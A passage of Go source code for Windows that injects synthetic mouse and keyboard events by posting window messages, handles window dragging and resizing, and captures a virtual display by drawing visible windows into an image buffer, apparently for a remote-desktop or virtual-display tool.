				procPostMessageW.Call(ncHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
			}
			return nil
		}
		if hitTest == HTMINBUTTON {
			procPostMessageW.Call(ncHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0)
			return nil
		}
	}

	clientPt := pt
	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))

	msg := uint32(WM_LBUTTONUP)
	wparam := uintptr(0)
	switch button {
	case 1:
		msg = WM_MBUTTONUP
	case 2:
		msg = WM_RBUTTONUP
	}

	procPostMessageW.Call(hitHwnd, uintptr(msg), wparam, makeLParam(clientPt.x, clientPt.y))
	return nil
}

func VirtualInputKeyDown(vk uint16) error {
	pt := virtualCurrentCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = foregroundWindow()
	}
	if hwnd == 0 {
		hwnd = virtualGetWorkingWindow()
	}
	if hwnd == 0 {
		hwnd = findAnyVisibleTopLevelWindow()
	}
	if hwnd == 0 {
		return nil
	}
	root := rootWindow(hwnd)
	prevWorking := virtualGetWorkingWindow()
	virtualRememberWorkingWindow(root)
	prevRoot := rootWindow(prevWorking)
	if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hwnd)
	}
	virtualUpdateModifierState(vk, true)

	if isModifierVK(vk) {
		return nil
	}

	if ch := virtualKeyToChars(vk); len(ch) > 0 && !isNonPrintableVK(vk) {
		for _, r := range ch {
			procPostMessageW.Call(hwnd, WM_CHAR, uintptr(r), uintptr(1))
		}
	} else {
		scan := mapVirtualKey(uint32(vk))
		lparam := uintptr(1 | (scan << 16))
		procPostMessageW.Call(hwnd, WM_KEYDOWN, uintptr(vk), lparam)
	}
	return nil
}

func VirtualInputKeyUp(vk uint16) error {
	pt := virtualCurrentCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = foregroundWindow()
	}
	if hwnd == 0 {
		hwnd = virtualGetWorkingWindow()
	}
	if hwnd == 0 {
		return nil
	}
	virtualUpdateModifierState(vk, false)

	if isModifierVK(vk) {
		return nil
	}

	scan := mapVirtualKey(uint32(vk))
	lparam := uintptr(1 | (scan << 16) | (1 << 30) | (1 << 31))
	procPostMessageW.Call(hwnd, WM_KEYUP, uintptr(vk), lparam)
	return nil
}

func VirtualInputMouseWheel(delta int32) error {
	pt := virtualCurrentCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = virtualGetWorkingWindow()
		if hwnd == 0 {
			return nil
		}
	}

	wparam := (uintptr(uint16(delta)) << 16) | uintptr(virtualCurrentMouseButtons())
	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
	return nil
}

func virtualCurrentCursor() point {
	virtualInputMu.Lock()
	if virtualHasCursor {
		pt := virtualLastCursor
		virtualInputMu.Unlock()
		return pt
	}
	virtualInputMu.Unlock()
	var pt point
	procGetCursorPosbackstage.Call(uintptr(unsafe.Pointer(&pt)))
	return pt
}

func virtualGetWorkingWindow() uintptr {
	virtualInputMu.Lock()
	defer virtualInputMu.Unlock()
	return virtualWorkingWindow
}

func virtualRememberWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	virtualInputMu.Lock()
	virtualWorkingWindow = hwnd
	virtualInputMu.Unlock()
}

func virtualCurrentMouseButtons() uint32 {
	virtualInputMu.Lock()
	defer virtualInputMu.Unlock()
	return virtualMouseButtons
}

func virtualSetMouseButton(button int, down bool) uint32 {
	virtualInputMu.Lock()
	defer virtualInputMu.Unlock()
	var mask uint32
	switch button {
	case 0:
		mask = MK_LBUTTON
	case 1:
		mask = MK_MBUTTON
	case 2:
		mask = MK_RBUTTON
	default:
		return virtualMouseButtons
	}
	if down {
		virtualMouseButtons |= mask
	} else {
		virtualMouseButtons &^= mask
	}
	return virtualMouseButtons
}

func virtualUpdateModifierState(vk uint16, down bool) {
	virtualInputMu.Lock()
	defer virtualInputMu.Unlock()
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
		virtualShiftDown = down
	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
		virtualCtrlDown = down
	case VK_MENU, VK_LMENU, VK_RMENU:
		virtualAltDown = down
	case VK_CAPITAL:
		if down {
			virtualCapsLock = !virtualCapsLock
		}
	}
}

func moveVirtualWindowIfDragging(screenPt point) {
	virtualInputMu.Lock()
	moving := virtualMovingWindow
	hwnd := virtualWindowToMove
	offset := virtualMoveOffset
	size := virtualWindowSize
	virtualInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func isVirtualResizeHit(hit int32) bool {
	return hit >= 10 && hit <= 17 // HTLEFT through HTBOTTOMRIGHT
}

func resizeVirtualWindowIfDragging(screenPt point) {
	virtualInputMu.Lock()
	hwnd, hit := virtualResizingWindow, virtualResizeHit
	start, r := virtualResizeStart, virtualResizeRect
	virtualInputMu.Unlock()
	if hwnd == 0 || !isVirtualResizeHit(hit) {
		return
	}
	dx, dy := screenPt.x-start.x, screenPt.y-start.y
	left, top, right, bottom := r.left, r.top, r.right, r.bottom
	switch hit {
	case 10, 13, 16:
		left += dx
	case 11, 14, 17:
		right += dx
	}
	switch hit {
	case 12, 13, 14:
		top += dy
	case 15, 16, 17:
		bottom += dy
	}
	const minW, minH = int32(120), int32(80)
	if right-left < minW {
		if hit == 10 || hit == 13 || hit == 16 {
			left = right - minW
		} else {
			right = left + minW
		}
	}
	if bottom-top < minH {
		if hit == 12 || hit == 13 || hit == 14 {
			top = bottom - minH
		} else {
			bottom = top + minH
		}
	}
	procSetWindowPos.Call(hwnd, 0, uintptr(left), uintptr(top), uintptr(right-left), uintptr(bottom-top), 0x0010|0x0040)
}

func endVirtualWindowResize() {
	virtualInputMu.Lock()
	virtualResizingWindow = 0
	virtualResizeHit = 0
	virtualInputMu.Unlock()
}

func endVirtualWindowDrag(screenPt point) {
	virtualInputMu.Lock()
	moving := virtualMovingWindow
	hwnd := virtualWindowToMove
	offset := virtualMoveOffset
	size := virtualWindowSize
	virtualMovingWindow = false
	virtualWindowToMove = 0
	virtualInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

var (
	virtualNoWindowLogNs atomic.Int64
	virtualCapImg        *image.RGBA
)

func VirtualCaptureDisplayFallback() (*image.RGBA, error) {
	captureMu.Lock()
	defer captureMu.Unlock()

	setDPIAware()

	bounds := virtualMonitorBounds
	srcW := bounds.Dx()
	srcH := bounds.Dy()
	if srcW <= 0 || srcH <= 0 {
		return nil, syscall.EINVAL
	}

	userScale := effectiveScale(srcW, srcH)
	dstW := int(float64(srcW) * userScale)
	dstH := int(float64(srcH) * userScale)
	if dstW <= 0 || dstH <= 0 {
		dstW = srcW
		dstH = srcH
	}

	capW := srcW
	capH := srcH

	hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
	if !ok {
		return nil, syscall.EINVAL
	}

	for i := range buf {
		buf[i] = 0
	}

	drawn := drawVirtualWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
	if drawn == 0 {
		now := time.Now().UnixNano()
		last := virtualNoWindowLogNs.Load()
		if now-last > int64(5*time.Second) && virtualNoWindowLogNs.CompareAndSwap(last, now) {
			log.Printf("virtual capture: no windows drawn for bounds=%v", bounds)
		}
	}

	swapRB(buf)

	img := virtualCapImg
	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
		virtualCapImg = img
	}
	copy(img.Pix, buf)

	_ = hdcMem

	if dstW != capW || dstH != capH {
		img = resizeNearest(img, dstW, dstH)
	}

	return img, nil
}

func drawVirtualWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
	hwnd := getTopWindow(0)
	if hwnd == 0 {
		return 0
	}
	hwnd = getWindow(hwnd, GW_HWNDLAST)
	if hwnd == 0 {
		return 0
	}

	if backstageWinCache == nil {
		backstageWinCache = make(map[uintptr]*backstageWinCacheEntry)
	}

	alive := make(map[uintptr]bool)
	drawn := 0

	for hwnd != 0 {
		var r rect
		ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
		if ok == 0 || r.right <= r.left || r.bottom <= r.top {
			alive[hwnd] = true
			hwnd = getWindow(hwnd, GW_HWNDPREV)
			continue
		}

		winLeft := int(r.left)
		winTop := int(r.top)
		winRight := int(r.right)
		winBottom := int(r.bottom)

		if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
			alive[hwnd] = true
			hwnd = getWindow(hwnd, GW_HWNDPREV)
			continue
		}

		if !isWindowVisible(hwnd) {
			alive[hwnd] = true
			hwnd = getWindow(hwnd, GW_HWNDPREV)
			continue
		}

		if drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
			drawn++
		}
		alive[hwnd] = true
		hwnd = getWindow(hwnd, GW_HWNDPREV)
	}

	for h, entry := range backstageWinCache {
		if !alive[h] {
			backstageFreeCacheEntry(entry)
			delete(backstageWinCache, h)
		}
	}

	return drawn
}
